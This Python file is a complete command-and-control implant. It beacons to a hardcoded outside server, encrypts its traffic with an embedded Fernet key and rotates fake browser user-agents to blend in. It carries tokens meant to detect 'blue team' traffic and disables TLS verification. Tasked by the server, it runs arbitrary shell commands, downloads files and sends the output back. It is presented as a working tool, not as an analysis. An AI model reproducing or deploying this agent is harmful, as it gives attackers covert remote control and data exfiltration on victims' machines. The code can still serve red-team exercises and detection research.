import time
import uuid
import random
import requests
import subprocess
from cryptography.fernet import Fernet
import json
import tls_client

############################################ VARIABLES ##############################################

############################################ CONFIG #################################################

# Configuration
SERVER_URL = "https://ebioscope.com"
BEACON_ENDPOINT = "/api/status"
RESULT_ENDPOINT = "/api/upload"
SLEEP_MIN = 5     # Minimum sleep in seconds
SLEEP_MAX = 15     # Maximum sleep in seconds


############################################# CRYPTO #################################################

# Crypto part
SECRET_KEY = b'Cll8NBmx_g8xAda-fKIM291E5Gyujun4fByZjgSKWJ8='
cipher = Fernet(SECRET_KEY)

def encrypt_data(data):
    encoded = data.encode()
    encrypted = cipher.encrypt(encoded)
    return encrypted.decode()

def decrypt_data(data):
    decrypted = cipher.decrypt(data.encode())
    return decrypted.decode()


######################################## FAKE HEADERS #################################################

# Fake user-agents to blend into normal traffic
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
]

# Fake tokens to determine if traffic is coming from blue team
TOKENS = [
    #"i8XNjC4b8KVok4uw5RftR38Wgp2BFwql",
    #"a84cvCDZ65Ef8zAAw5sSd54xWq4SDqPq",
    "f65DFG9VVx237QawGHRM32xSqAB4nNsR"
]

# Generate a unique ID for this agent
AGENT_ID = str(uuid.uuid4())
USER_AGENT = random.choice(USER_AGENTS)
CSRF_ID = random.choice(TOKENS);
headers = {"User-Agent": random.choice(USER_AGENTS),
           "X-Csrf-Token": CSRF_ID,
           "Authorization": f"Bearer {AGENT_ID}",
           "X-Session-ID": str(uuid.uuid4())
           }

############################################# LOGIC ###############################################

########################################### CHECK FOR TASKS #######################################

# Check for tasks to server
def beacon():

    raw_payload = {"id": AGENT_ID}
    try:
        '''session = tls_client.Session(client_identifier="firefox_108")
        session.verify_ssl = False'''
        session = requests.Session()
        session.verify = False
        encrypted_payload = encrypt_data(json.dumps(raw_payload))
        print(AGENT_ID)
        response = session.post(SERVER_URL + BEACON_ENDPOINT, json={"data" : encrypted_payload}, headers=headers)
        print(response)
        if response.status_code == 200:
            encrypted_data = response.json().get("data")
            decrypted_data = decrypt_data(encrypted_data)
            data = json.loads(decrypted_data)
            print(data)
            task = data.get("task")
            if task:
                if task != "None":
                    execute_task(task)
    except Exception as e:
        print(f"[!] Beacon error: {e}")

################################################ TASKS ###################################################

def execute_task(task_data):
    for task in task_data:
        
        print(task)
        task_type = task.get("type")

        if task_type == "shell":
            command = task.get("command")
            run_shell(command)
        elif task_type == "download":
            url = task.get("url")
            save_as = task.get("save_as")
            download_file(url, save_as)
        elif task_type == "sleep":
            global SLEEP_MIN, SLEEP_MAX
            SLEEP_MIN = task.get("min", SLEEP_MIN)
            SLEEP_MAX = task.get("max", SLEEP_MAX)
        else:
            print(f"[!] Unknown task type: {task_type}")

def run_shell(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        post_result(result.decode())
    except subprocess.CalledProcessError as e:
        post_result(e.output.decode())

def download_file(url, save_as):
    try:
        response = requests.get(url, stream=True)
        with open(save_as, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        post_result(f"[+] Downloaded {url} as {save_as}")
    except Exception as e:
        post_result(f"[!] Download error: {str(e)}")


########################################### HANDLE TASKS RESULTS ####################################

# Send back results
def post_result(result):
    raw_payload = {"id": AGENT_ID, "output": result}
    try:
        session = requests.Session()
        session.verify = False
        encrypted_payload = encrypt_data(json.dumps(raw_payload))
        session.post(SERVER_URL + RESULT_ENDPOINT, json={"data" : encrypted_payload}, headers=headers)
    except Exception as e:
        print(f"[!] Result posting error: {e}")

########################################## MAIN METHOD #############################################
# Main method
def main():
    while True:
        beacon()
        sleep_time = random.randint(SLEEP_MIN, SLEEP_MAX)
        time.sleep(sleep_time)

if __name__ == "__main__":
    main()
